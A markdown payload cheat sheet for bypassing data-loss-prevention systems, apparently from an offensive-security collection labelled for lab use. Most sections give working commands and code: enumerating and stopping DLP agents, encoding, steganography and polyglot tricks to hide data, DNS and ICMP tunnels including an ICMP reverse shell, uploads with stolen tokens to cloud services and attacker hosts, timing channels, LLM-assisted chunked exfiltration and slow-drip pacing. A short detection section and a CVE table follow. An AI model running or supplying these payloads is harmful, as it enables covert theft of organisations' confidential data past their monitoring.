# Payloads — data-loss-prevention-bypass

> Attack payloads for DLP evasion and covert data exfiltration (authorized lab use only).
> Strategy: every DLP deployment inspects a finite set of channels at a finite set of
> enforcement points (endpoint agent, proxy, CASB, email gateway). Bypass = pick a
> channel × encoding × rate combination that falls outside every deployed inspection lane.

## 1. Channel Selection Matrix

| Inspection lane | What it sees | Classic blind spots |
|-----------------|--------------|---------------------|
| Endpoint agent (EDR-adjacent) | File ops, clipboard, print, USB, browser upload | ADS, portable apps, alternate browser profiles, guest SMB, stego carriers |
| Network proxy (HTTP/S inspection) | Categorized HTTP/S bodies | Encrypted archives, multipart chunking, non-HTTP protocols (DNS/ICMP/QUIC) |
| CASB / SaaS API | Sanctioned SaaS uploads | Webhooks, API comments, presigned URLs, resumable chunk upload |
| Email gateway | Attachments, links | Password-protected archives, stego images, links to cloud objects |
| Egress firewall (L3/L4) | Destinations, ports, volume | Allowed-destination piggyback (CDN, SaaS, update servers), slow drip |

Recon first: which lanes exist, then select from §2–§14 accordingly.

## 2. Endpoint DLP Agent Reconnaissance

```bash
# Windows: enumerate DLP agent processes / services / drivers (names observed in the wild)
tasklist /v | findstr /i "dgagent forcepoint dlp symantecdlp trellix nlagent"
sc query type= service state= all | findstr /i "DLP Guardian Forcepoint Netskope"
driverquery /v | findstr /i "dgdriver fpdrv dlpfsd"

# Identify self-protection: try to stop the agent (tamper-proof agents will refuse)
net stop "Digital Guardian Agent" 2>&1 | head -2

# Check monitored-path coverage: which browsers/protocols the policy hooks
reg query "HKLM\SOFTWARE\WOW6432Node\Digital Guardian" /s 2>nul | head -30

# macOS: Endpoint Security Framework clients (DLP rides ESF on modern macOS)
systemextensionsctl list | grep -i -E "dlp|guardian|forcepoint|symantec"

# Linux: locate agent config + exclusion lists (world-readable misconfigs are common)
find /etc /opt -iname "*dlp*" -o -iname "*guardian*" 2>/dev/null | head
```

Known agent-weakness classes: see §17 CVEs (Forcepoint endpoint self-disable,
Digital Guardian agent uninstall abuse) — historical patterns, verify on target
version before relying on them.

## 3. Content Transform Evasion

```bash
# Base32 of payload, then split across certificate-looking blobs (defeats regex banks)
certutil -encode secret.zip b64.txt
split -b 512 b64.txt chunk_ && ls chunk_*

# Nested encoding chain: gzip -> hex -> reverse -> wrap in log-like lines
gzip -c secret.txt | xxd -p | rev | fold -w 96 | sed 's/^/[debug] /' > fake.log
```

```python
# zero-width steganography (ZWSP U+200B=0, ZWNJ U+200C=1) — carrier: innocuous text
ZW = {"0": "\u200b", "1": "\u200c"}
def zw_encode(data: bytes) -> str:
    bits = "".join(f"{b:08b}" for b in data)
    return "".join(ZW[b] for b in bits)
def zw_decode(text: str) -> bytes:
    rev = {v: k for k, v in ZW.items()}
    bits = "".join(rev[c] for c in text if c in rev)
    return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

# Homoglyph substitution: Cyrillic 'а' (U+0430) passes visual + keyword checks
def homo(text: str) -> str:
    return text.replace("a", "\u0430")
```

## 4. Archive & Container Evasion

```bash
# Encrypted-header archive: DLP cannot open → policy usually quarantines, tune size under it
7z a -pPassw0rd! -mhe=on secret.7z sensitive.xlsx

# Polyglot: valid GIF that is also a ZIP (browsers render; unzip extracts)
cat header.gif secret.zip > polyglot.gif && unzip -l polyglot.gif

# Alternate Data Stream (Windows endpoint blind spot — see TC-010)
cmd /c "type secret.txt > holiday.png:ads"
cmd /c "more < holiday.png:ads > recovered.txt"

# Split below per-file size thresholds before any transport (§13)
split -b 900k secret.7z part_
```

## 5. Steganography Channels

```bash
# Image LSB embed/extract
steghide embed -cf cover.jpg -ef secret.txt -p password -e none -z 1
steghide extract -sf cover.jpg -p password

# Blue-side detection (false-positive heavy — pair with entropy baselines)
java -jar StegExpose.jar suspect.png
zsteg -a suspect.png | head -20

# Audio spectrogram watermark (voice memo carriers pass as benign media)
sox cover.wav -n spectrogram -o before.png

# Video frame LSB: exfil split across N frames of a rendered slideshow
ffmpeg -i slides.mov -vf "select=not(mod(n\,10))" frame_%03d.png
for f in frame_*.png; do zsteg -a "$f" | grep -m1 b1,rgb,lsb; done
```

```python
# PNG LSB embed with plain loop (no stego tooling needed on target)
from PIL import Image  # pip install pillow
def lsb_embed(carrier: str, data: bytes, out: str) -> None:
    img = Image.open(carrier).convert("RGB")
    px, w = img.load(), img.width
    bits = "".join(f"{b:08b}" for b in data) + "0" * 8   # null terminator
    assert len(bits) <= w * img.height * 3, "carrier too small"
    for i, b in enumerate(bits):
        idx, c = i // 3, i % 3
        x, y = idx % w, idx // w
        r, g, bl = px[x, y]
        v = int(b)
        px[x, y] = (r | v, g, bl) if c == 0 else (r, g | v, bl) if c == 1 else (r, g, bl | v)
    img.save(out)
```

## 6. DNS Tunneling

```bash
# dnscat2 — authoritative server on NS for attacker.lab
ruby dnscat2.rb attacker.lab --secret=S3cr3t -v
# client (authoritative lab): pure DNS, no TUN
./dnscat2 --dns domain=attacker.lab --secret=S3cr3t

# iodine (TUN-based; better throughput, noisier)
iodined -f -c -P S3cr3t 10.0.7.1 tunnel.attacker.lab   # server
iodine -f -P S3cr3t tunnel.attacker.lab                # client

# dns2tcp (no TUN, TCP-over-DNS)
dns2tcpd -f dns2tcpd.conf -d 1
dns2tcpc -z tunnel.attacker.lab -r ssh -l 2222
```

```bash
# DoH relay variant (bypasses DNS-inspecting proxies entirely):
# decode side reads TXT answers through a public DoH resolver via HTTPS
curl -s 'https://dns.google/resolve?name=CHUNK.tunnel.attacker.lab&type=TXT' \
  | jq -r '.Answer[0].data'

# Volume shaping: TXT chunk ≤ 200 bytes and QPS ≤ 5 mimic CDN retry traffic;
# larger chunks trip NXDOMAIN-ratio and label-entropy alerts
```

## 7. ICMP Tunneling

```bash
# pingtunnel (Go, ICMP echo request/reply; survives most egress filters)
pingtunnel -type server -l :4443
pingtunnel -type client -l :1080 -s attacker.com -tunnel 4443 -socks5 1

# icmpsh (simple reverse shell over ICMP)
sysctl -w net.ipv4.ping_group_range="0 65535"
python2 icmpsh_m.py attacker_ip victim_ip &

# Raw hping3 payload carve (no tunnel tooling on target)
hping3 -1 attacker.com --data 64 -E chunk_01 -d 56 -c 1

# Sizing: fixed 56-byte data, 1 pkt/s — indistinguishable from heartbeat probes
```

## 8. SaaS/API Masquerade (Allowed-Destination Piggyback)

```bash
# Microsoft Graph — upload with benign name/extension (CASB may key on extension)
curl -X PUT "https://graph.microsoft.com/v1.0/me/drive/root:/photos/vacation.png:/content" \
  -H "Authorization: Bearer $STOLEN_TOKEN" --data-binary @polyglot.gif

# Google Drive resumable upload — chunks look like photo backup traffic
URL=$(curl -s -X POST "https://www.googleapis.com/upload/drive/v3/files?uploadType=resumable" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/octet-stream" \
  -d '{"name":"backup_001.bin"}' -o /dev/null -w '%{redirect_url}')
split -b 262144 secret.7z part_ && for f in part_*; do
  curl -X PUT "$URL" --data-binary "@$f" -H "Content-Length: $(stat -c%s "$f")"; done

# Slack/Discord webhook segmented paste (each < message limit, reassemble by tag)
split -b 3500 secret.txt msg_ && for f in msg_*; do
  curl -s -X POST "$WEBHOOK" -H 'Content-Type: application/json' \
    -d "{\"content\":\"$(base64 "$f" | tr -d '\n')\"}"; sleep 30; done

# GitHub exfil: private repo comments as storage (allowed developer destination)
gh api repos/target-corp/notes/comments -f body="chunk_$(date +%s): $(base64 -w0 part_aa)"
```

## 9. Cloud Storage Abuse

```bash
# Presigned-URL cycling (fetch URL out-of-band; object stores are allow-listed)
aws s3 cp secret.7z "s3://attacker-bucket/$(openssl rand -hex 4).bin"

# rclone encrypted remote: uploads are client-side ciphertext to a sanctioned provider
rclone copy secret.7z crypt_remote:photos/ --transfers 1 --tpslimit 2

# Azure blob SAS token (grant comes from a leaked SAS, not exfil-time auth)
az storage blob upload --account-name backupcdn --sas-token "$SAS" \
  -c media -f secret.7z -n "cache/$(date +%s).tmp"
```

## 10. WebSocket / HTTP/2 / HTTP3 Covert Channels

```bash
# WebSocket trickle: WSS to an allowed SaaS domain relays via reverse proxy
websocat wss://collab.attacker-lab.example/ws < encoded_stream.txt

# HTTP/3 (QUIC): many proxies inspect TCP/HTTP2 only
curl --http3-only --limit-rate 4k -T secret.7z https://cdn.attacker-lab.example/u

# HTTP/2 multiplex trickling: N concurrent streams each carry ~1KB/s
h2load -n 64 -c 8 --input-file chunk_list.txt https://attacker-lab.example/
```

## 11. Covert Timing Channel

```python
# Encode 1 bit per request interval; inter-arrival deltas carry the payload
import time, urllib.request
BASE, BIT = 2.0, 0.4   # seconds; jitter < BIT keeps decoding reliable
def send(bits: str, url: str) -> None:
    prev = time.time()
    for b in bits:
        prev += BASE + (BIT if b == "1" else 0)
        time.sleep(max(0, prev - time.time()))
        urllib.request.urlopen(url, timeout=5).read(1)
```

## 12. AI-Augmented Semantic Exfiltration

```python
# Split document into semantically self-contained chunks that individually
# miss keyword/classifier thresholds; reassembly key is chunk order + map.
chunks = llm_client.chunk(document, style="meeting_notes", max_words=120)
for i, c in enumerate(chunks):
    post(f"https://notes.attacker-lab.example/{i:03d}", c)  # innocuous SaaS posts
# Recovery: fetch ordered chunks, join — no single post contains a full pattern
```

## 13. Slow-Drip & Threshold Evasion

```bash
# Trickle at business-hours cadence; delete parts as they succeed
for f in part_*; do
  curl -s -T "$f" "https://cdn.attacker-lab.example/$(date +%F)/$f" && trash "$f"
  sleep $((RANDOM % 1800 + 600))   # 10-40 min jitter
done
```

## 14. Protocol Mimicry

```bash
# Package exfil as HLS video segments (media CDN egress lane)
ffmpeg -re -i slides.mov -f hls -hls_time 6 \
  -hls_segment_filename "seg%03d.ts" out.m3u8
tar cf media.tar seg*.ts && curl -T media.tar https://cdn.attacker-lab.example/

# Mimic nightly backup: renamed parts over rsync to an update-server allow-list
tar cf - --transform 's|part_|var/log/app/|' part_* \
  | rsync -az -e ssh backup@updates.attacker-lab.example:/backups/
```

## 15. Detection Engineering (Blue Perspective)

```text
# Suricata: DNS tunnel heuristics — long labels, TXT-heavy, high NXDOMAIN ratio
alert dns $HOME_NET any -> any any (msg:"DLP-EV DNS tunnel heuristic"; dns.query; \
  pcre:"/^[a-z0-9]{30,}\./i"; sid:9000001; rev:1;)
```

```text
# Splunk SPL: periodic low-volume beaconing to a single SaaS destination
index=proxy | bin span=5m _time | stats count, stdev(bytes) AS sd BY src, url_domain \
  | where count > 50 AND sd < 1000
```

```text
# Falco: endpoint — process writing media artifact then uploading in short window
- rule: Media File Sudden Upload
  desc: user process modifies media artifact then performs network send within 120s
  condition: evt.type in (open, sendto) and fd.name endswith .png
```

## 16. Cleanup & OPSEC

```bash
# Lab teardown: shred local split parts, restore agent state where policy allows
for f in part_* chunk_* msg_* fake.log b64.txt; do [ -f "$f" ] && srm -ll "$f"; done
```

## 17. Known DLP Product CVEs (NVD-verified, v0.3.7)

All IDs verified against the NVD API on 2026-11-09 before inclusion.

| CVE | Product | CVSS | Relevance (from NVD record) |
|-----|---------|------|------------------------------|
| CVE-2022-1700 | Forcepoint DLP Policy Engine | 7.5 | XXE in the policy engine — content-inspection bypass class |
| CVE-2019-6144 | Forcepoint One Endpoint | 6.5 | Non-admin user can disable the endpoint agent — enforcement off |
| CVE-2018-10173 | Digital Guardian Management Console | 8.8 | Authenticated RCE in the DLP management console |
| CVE-2018-10174 | Digital Guardian Management Console | 6.5 | SSRF in console — policy/config read |
| CVE-2022-35412 | Digital Guardian Agent | 5.1 | Admin-triggerable agent uninstall abuse — monitoring gap |
| CVE-2014-9230 | Symantec DLP Enforce Server | — | XSS in the DLP admin console (Enforce) |

## 18. References

- MITRE ATT&CK — Exfiltration Over Alternative Protocol: https://attack.mitre.org/techniques/T1048/
- dnscat2: https://github.com/iagox86/dnscat2
- iodine (IP-over-DNS): https://code.kryo.se/iodine/
- StegExpose (LSB detection): https://github.com/b3dk7/StegExpose
- zsteg (PNG stego analysis): https://github.com/zed-0xff/zsteg
- Microsoft Graph drive-item upload API: https://learn.microsoft.com/onedrive/developer/rest-api/api/driveitem_put_content
- Google Drive resumable upload: https://developers.google.com/drive/api/guides/manage-uploads
- curl HTTP/3 documentation: https://everything.curl.dev/http3
- Suricata rule docs: https://docs.suricata.io/rules/
- Sigma detection rules: https://github.com/SigmaHQ/sigma
